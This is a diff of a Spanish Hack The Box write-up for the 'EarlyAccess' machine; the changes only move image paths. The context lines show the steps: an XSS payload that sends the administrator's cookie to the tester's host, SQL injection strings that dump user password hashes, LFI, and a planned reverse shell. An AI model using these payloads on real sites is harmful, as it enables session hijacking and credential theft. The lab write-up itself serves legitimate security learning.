@@ -7,20 +7,20 @@ excerpt: "Máquina Linux de dificultad alta, con mucha enumeración, distintas t
 description: "Máquina Linux de dificultad alta, con mucha enumeración, distintas técnicas y vulnerabilidades que tocar. Nos aprovecharemos de XSS, SQLI, Cookie Hijacking, entre otras. Realizaremos pivoting de usuarios gracias a la reutilización de contraseñas y pivoting de contenedores Docker enumerando con Nmap y utilizando Port-Forwarding (Chisel)."
 date: 2022-02-13
 header:
-  teaser: /assets/images/hackthebox/earlyaccess.png
+  teaser: /assets/images/hackthebox/machines/earlyaccess.png
   teaser_home_page: true
   icon: /assets/images/hackthebox.webp
 categories: [HackTheBox, Pentesting, Web Exploiting, Pivoting, Port Forwarding, Privilege Escalation]
 tags: [WEAK PASSWORD, SOURCE CODE REVIEW, PASSWORD REUSE, API, DOCKER, RCE, LFI, SUID, SQLI, COOKIE HIJACKING, XSS]
 ---
 
-<p align="center"><img src="/assets/images/hackthebox/earlyaccess.png"></p>
+<p align="center"><img src="/assets/images/hackthebox/machines/earlyaccess.png"></p>
 
 Saludos pentesters, en esta ocasión volvemos a la carga con una máquina Linux recién retirada, de dificultad Hard en la que tocamos muchos conceptos y técnicas. 
 
 ## Fecha de Resolución
 
-<p align="center"><a href="https://www.hackthebox.com/achievement/machine/18979/375"><img src="/assets/images/hackthebox/earlyaccess/pwned_date.png"></a></p>
+<p align="center"><a href="https://www.hackthebox.com/achievement/machine/18979/375"><img src="/assets/images/hackthebox/machines/earlyaccess/pwned_date.png"></a></p>
 
 ## Fase de Reconocimiento
 
@@ -160,23 +160,23 @@ Requests/sec.: 0
 Añadimos los subdominios **`dev.earlyaccess.htb`** y **`game.earlyaccess.htb`** a nuestro archivo **`/etc/hosts`** para poder acceder posteriormente.
 Primero vamos a ver qué tenemos en la página principal:
 
-![Website](/assets/images/hackthebox/earlyaccess/website.png)
+![Website](/assets/images/hackthebox/machines/earlyaccess/website.png)
 
 En este punto podemos registrar una cuenta nueva para poder analizar la página.
 
-![Registration](/assets/images/hackthebox/earlyaccess/registration.png)
+![Registration](/assets/images/hackthebox/machines/earlyaccess/registration.png)
 
-![Welcome](/assets/images/hackthebox/earlyaccess/welcome.png)
+![Welcome](/assets/images/hackthebox/machines/earlyaccess/welcome.png)
 
 ## Fase de Explotación
 
 Lo primero que me llama la atención es el apartado **`Register key`**, en el cual puedes registrar una clave del juego. Luego veremos esto en más detalle.
 
-![GameKey](/assets/images/hackthebox/earlyaccess/addkey.png)
+![GameKey](/assets/images/hackthebox/machines/earlyaccess/addkey.png)
 
 De momento volvamos a fijarnos en el apartado **`Messaging`**, vemos que tenemos un formulario de contacto en **`Contact Us`**:
 
-![ContactUs](/assets/images/hackthebox/earlyaccess/contactus.png)
+![ContactUs](/assets/images/hackthebox/machines/earlyaccess/contactus.png)
 
 Podemos probar [XSS Injection](https://owasp.org/www-community/attacks/xss/) aprovechando este apartado para tratar de secuestrar la cookie de sesión del administrador.
 Para ello primero necesitamos levantar un servidor HTTPS en nuestra máquina, esto podemos hacerlo con Python3.
@@ -197,12 +197,12 @@ Serving HTTPS on 10.10.16.29 port 4443 (https://10.10.16.29:4443/) ...
 Teniendo esto listo, nos vamos a nuestro perfil en https://earlyaccess.htb/user/profile y cambiamos nuestro nombre,
 debido a que el campo **`Name`** es vulnerable a XSS y será el que lea el administrador cuando le escribamos un mensaje desde el formulario de contacto:
 
-![XSS](/assets/images/hackthebox/earlyaccess/xss1.png)
+![XSS](/assets/images/hackthebox/machines/earlyaccess/xss1.png)
 
 El payload que estaremos utilizando es el siguiente:
 > <script>var i=new Image; i.src="https://10.10.16.29:4443/?"+document.cookie;</script>
 
-![XSS](/assets/images/hackthebox/earlyaccess/xss2.png)
+![XSS](/assets/images/hackthebox/machines/earlyaccess/xss2.png)
 
 Guardamos los cambios y probamos a enviarle un mensaje al administrador. Tardará un rato en procesar nuestro mensaje una vez enviado, por lo que esperamos un par de minutos...
 
@@ -222,15 +222,15 @@ por lo que hay que tener cuidado y separarlas correctamente para poder utilizarl
 
 Gracias al inspector del navegador podemos modificar fácilmente las cookies y secuestrar la sesión del administrador:
 
-![Cookie](/assets/images/hackthebox/earlyaccess/cookie.png)
+![Cookie](/assets/images/hackthebox/machines/earlyaccess/cookie.png)
 
 Una vez cambiadas le damos a refrescar la página con la tecla F5 (no hagas click en el símbolo de refrescar al lado de las cookies porque eso volverá a establecer tus cookies, no la del administrador).
 
-![Admin](/assets/images/hackthebox/earlyaccess/admin1.png)
+![Admin](/assets/images/hackthebox/machines/earlyaccess/admin1.png)
 
 Vemos que el menú ha cambiado y ahora tenemos acceso a funciones administrativas, echemos un vistazo.
 
-![Admin](/assets/images/hackthebox/earlyaccess/admin2.png)
+![Admin](/assets/images/hackthebox/machines/earlyaccess/admin2.png)
 
 Aquí tenemos disponible para descargar un script escrito en Python, que podemos utilizar para validar claves del juego,
 según explica el administrador, esto lo ha puesto para cuando la API no responda, que el resto de administradores puedan validar las claves de los usuarios.
@@ -305,62 +305,62 @@ Your key is KEY84-0F1O4-XPCZ9-GAMM4-01363
 
 Verificamos en la página **https://earlyaccess.htb/key** y nos dice que es válida.
 
-![Valid Key](/assets/images/hackthebox/earlyaccess/validkey.png)
+![Valid Key](/assets/images/hackthebox/machines/earlyaccess/validkey.png)
 
 Podemos visitar **`game.earlyaccess.htb`** con nuestra clave validada e introducirla, pero primero tenemos que iniciar sesión con el usuario que creamos al principio
 y registrar la clave generada para que se asocie a nuestra cuenta.
 
-![Game Domain](/assets/images/hackthebox/earlyaccess/gamedomain.png)
+![Game Domain](/assets/images/hackthebox/machines/earlyaccess/gamedomain.png)
 
 > NOTA: Si nos da error de usuario no válido, es posible que haya caducado la sesión, en este caso tendremos que registrar una nueva cuenta.
 
-![Register Key](/assets/images/hackthebox/earlyaccess/regkey.png)
+![Register Key](/assets/images/hackthebox/machines/earlyaccess/regkey.png)
 
 Ya que tenemos la clave registrada en nuestra cuenta, nos dirigimos al apartado **`Game`** que nos ha aparecido en el menú.
 
-![Game](/assets/images/hackthebox/earlyaccess/game.png)
+![Game](/assets/images/hackthebox/machines/earlyaccess/game.png)
 
 Aquí vemos el típico juego de la serpiente, pero no parece estar funcional porque a mí no me deja moverme en el juego. Revisemos las opciones del menú superior.
 
-![Scoreboard](/assets/images/hackthebox/earlyaccess/scoreboard.png)
+![Scoreboard](/assets/images/hackthebox/machines/earlyaccess/scoreboard.png)
 
-![Leaderboard](/assets/images/hackthebox/earlyaccess/leaderboard.png)
+![Leaderboard](/assets/images/hackthebox/machines/earlyaccess/leaderboard.png)
 
 Podemos tratar de provocar un **`SQLI`** como hicimos anteriormente con XSS, esta vez modificaremos nuestro nombre de perfil para introducir una comilla simple.
 
-![SQLI Test](/assets/images/hackthebox/earlyaccess/sqlitest.png)
+![SQLI Test](/assets/images/hackthebox/machines/earlyaccess/sqlitest.png)
 
 Si recargamos la página del juego vemos que ahora se ha producido un error, confirmando que es vulnerable a SQLI.
 
-![SQL Error](/assets/images/hackthebox/earlyaccess/sqlerror.png)
+![SQL Error](/assets/images/hackthebox/machines/earlyaccess/sqlerror.png)
 
 Cambiemos nuestro nombre de usuario de nuevo para incluir una consulta SQL más específica:
 > ') union select 1,2,user()-- -
 
-![SQLI](/assets/images/hackthebox/earlyaccess/sqli1.png)
+![SQLI](/assets/images/hackthebox/machines/earlyaccess/sqli1.png)
 
 Recargamos la página del Scoreboard...
 
-![SQLI](/assets/images/hackthebox/earlyaccess/sqli2.png)
+![SQLI](/assets/images/hackthebox/machines/earlyaccess/sqli2.png)
 
 Vemos que existe un usuario de nombre **`game`**, anotemos este dato para más adelante por si nos fuera de utilidad.
 Ahora vamos a modificar de nuevo nuestro nombre para realizar una consulta completa y listar todos los usuarios y sus contraseñas:
 > ') union select 1,2,concat(name,':',password) FROM users-- -
 
-![SQLI](/assets/images/hackthebox/earlyaccess/sqli3.png)
+![SQLI](/assets/images/hackthebox/machines/earlyaccess/sqli3.png)
 
 Recargamos nuevamente el Scoreboard...
 
-![SQLI](/assets/images/hackthebox/earlyaccess/sqli4.png)
+![SQLI](/assets/images/hackthebox/machines/earlyaccess/sqli4.png)
 
 Tenemos los hashes de los usuarios, en este caso vemos dos diferentes para el usuario **`admin`**. Utilizo **`crackstation.net`** para tratar de romper estos hashes:
 
-![Cracked Passwords](/assets/images/hackthebox/earlyaccess/crackedpass.png)
+![Cracked Passwords](/assets/images/hackthebox/machines/earlyaccess/crackedpass.png)
 
 Con estas credenciales podemos iniciar sesión como el administrador y echarle un ojo a **`dev.earlyaccess.htb`**
 > NOTA: Si no carga bien el recurso, es posible que haya quedado cacheado en el navegador, prueba con Ctrl+F5 o limpia la caché.
 
-![Dev](/assets/images/hackthebox/earlyaccess/dev.png)
+![Dev](/assets/images/hackthebox/machines/earlyaccess/dev.png)
 
 Apliquemos un poco de fuzzing sobre este subdominio para ver si encontramos algo interesante:
 
@@ -429,11 +429,11 @@ Requests/sec.: 88.44467
 
 Hemos encontrado 4 archivos, de los cuales me llaman la atención **`file.php`** y **`hash.php`**, veamos qué contienen.
 
-![HashingTools](/assets/images/hackthebox/earlyaccess/hashtools.png)
+![HashingTools](/assets/images/hackthebox/machines/earlyaccess/hashtools.png)
 
-![FileTools](/assets/images/hackthebox/earlyaccess/filetools.png)
+![FileTools](/assets/images/hackthebox/machines/earlyaccess/filetools.png)
 
-![LFI](/assets/images/hackthebox/earlyaccess/lfi1.png)
+![LFI](/assets/images/hackthebox/machines/earlyaccess/lfi1.png)
 
 Aquí se empieza a tensar la cosa, porque por lo visto **`file.php`** es vulnerable a [Local File Inclusion (LFI)](https://ironhackers.es/herramientas/lfi-cheat-sheet/).
 Vamos a fuzzear de nuevo este archivo en busca de parámetros que puedan ser vulnerables:
@@ -465,9 +465,9 @@ Sabiendo esto, podemos obtener cualquier archivo del sistema, para ello vamos a 
 
 De este modo podemos copiar el resultado para luego decodificarlo y así obtener el codigo php del archivo hash.
 
-![LFI](/assets/images/hackthebox/earlyaccess/lfi2.png)
+![LFI](/assets/images/hackthebox/machines/earlyaccess/lfi2.png)
 
-![Decode](/assets/images/hackthebox/earlyaccess/decode.png)
+![Decode](/assets/images/hackthebox/machines/earlyaccess/decode.png)
 
 Analizamos el código php y vemos que el archivo utiliza **`hash_function`** como variable para el tipo de hash a utilizar,
 también se utiliza **`password`** como variable para el valor a codificar. Todas las variables son tomadas con **`$_REQUEST`**.
@@ -925,9 +925,9 @@ Si vamos al navegador en nuestra máquina y abrimos **http://127.0.0.1:9999/** e
 En el apartado autoplay podemos simular un total de N partidas, pero si ponemos un número negativo, 
 se produce un fallo en la aplicación y ésta se reinicia pasado un minuto aprox. Aprovecharemos esto para meter una shell inversa.
 
-![Game Test](/assets/images/hackthebox/earlyaccess/gametest1.png)
+![Game Test](/assets/images/hackthebox/machines/earlyaccess/gametest1.png)
 
-![Game Test](/assets/images/hackthebox/earlyaccess/gametest2.png)
+![Game Test](/assets/images/hackthebox/machines/earlyaccess/gametest2.png)
 
 Antes de continuar, vamos a revisar el directorio raíz para ver qué encontramos:
 
